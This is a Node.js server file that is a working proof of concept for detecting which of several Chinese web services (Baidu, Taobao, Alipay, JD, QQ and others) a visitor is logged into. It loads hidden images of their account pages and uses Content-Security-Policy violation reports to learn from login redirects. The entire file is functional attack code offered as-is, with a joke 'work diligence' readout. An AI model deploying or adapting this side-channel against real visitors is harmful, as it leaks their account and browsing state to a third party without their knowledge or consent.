var http = require('http');
var qs = require('querystring');

http.createServer(function(req, res) {

  if (req.method == 'POST') {
    var body = '';
    req.on('data', function(data) {
      body += data;
      // 1e6 === 1 * Math.pow(10, 6) === 1 * 1000000 ~~~ 1MB
      if (body.length > 1e6) {
        // FLOOD ATTACK OR FAULTY CLIENT, NUKE REQUEST
        req.connection.destroy();
      }
    });
    req.on('end', function() {
      var report = JSON.parse(body);
      if(report['csp-report']['blocked-uri'].indexOf('baidu.com') != -1){
        var csp_result = "baidu=1";
      }
      if(report['csp-report']['blocked-uri'].indexOf('sina.com') != -1){
        var csp_result = "weibo=1";
      }
      if(report['csp-report']['blocked-uri'].indexOf('taobao.com') != -1){
        var csp_result = "taobao=1";
      }
      if(report['csp-report']['blocked-uri'].indexOf('alipay.com') != -1){
        var csp_result = "alipay=1";
      }
       if(report['csp-report']['blocked-uri'].indexOf('jd.com') != -1){
        var csp_result = "jd=1";
      }
       if(report['csp-report']['blocked-uri'].indexOf('meituan.com') != -1){
        var csp_result = "meituan=1";
      }
      if(report['csp-report']['blocked-uri'].indexOf('qq.com') != -1){
        var csp_result = "qq=1";
      }
      res.writeHead(200, {
        "Set-Cookie": [csp_result]
      });
      res.end('');
    });
  } else {

    var header = {
      'Content-Type': 'text/html',
      'Content-Security-Policy-Report-Only': ['img-src http://wenku.baidu.com http://video.sina.com.cn http://member1.taobao.com/ https://personalportal.alipay.com http://order.jd.com http://www.meituan.com http://p.t.qq.com; report-uri /report']
    };

    res.writeHead(200, header);
    var htmlContent='<body onload="load()">\
    <img src="http://wenku.baidu.com/user/mydocs" width=0><img src="http://video.sina.com.cn/shijiao/video/published" width=0>\
    <img src="http://member1.taobao.com/member/fresh/account_security.htm" width=0>\
    <img src="https://personalportal.alipay.com/portal/account/index.htm" width=0>\
    <img src="http://order.jd.com/center/list.action" width=0>\
    <img src="http://www.meituan.com/account/points?mtt=1.orders%2Flist.0.0.i5t969zs" width=0>\
    <img src="http://p.t.qq.com/setting" width=0>\
    <script>\
      function load(){\n\
        var config_json = {"baidu":"百度","weibo":"新浪微博","taobao":"淘宝网","alipay":"支付宝","jd":"京东商城","meituan":"美团网","qq":"腾讯微博"};\n\
        for(var key in config_json){\n\
          if(getCookie(key) == 1){\n\
            delete config_json[key];\n\
          }\n\
        }\n\
        var res = [];\n\
        for(var key in config_json){\n\
            res.push(config_json[key]);\n\
        }\n\
        alert("系统检测到您目前登陆了: "+res);\n\
        alert("你的工作认真指数为: "+ (100 - res.length/7*100) );\n\
        var keys=document.cookie.match(/[^ =;]+(?=\=)/g);\
        if (keys) {\
          for (var i = keys.length; i--;)\
          document.cookie=keys[i]+"=0;expires=" + new Date(0).toUTCString()\
        }\
      }\n\
      function getCookie(cookieName) {\n\
      var cookieObj = {},\n\
          cookieSplit = [],\n\
          cookieArr = document.cookie.split(";");\n\
        for (var i = 0, len = cookieArr.length; i < len; i++){\n\
          if (cookieArr[i]) {\n\
            cookieSplit = cookieArr[i].split("=");\n\
            if(cookieSplit[0] != undefined && cookieSplit[1] != undefined){\n\
            cookieObj[cookieSplit[0].trim()] = cookieSplit[1].trim();}\n\
          }\n\
        }\n\
        return cookieObj[cookieName];\n\
      }\n\
    </script></body>';
    res.end(htmlContent);
  }

}).listen(8080, '127.0.0.1');

console.log('Server running at http://127.0.0.1:8080/');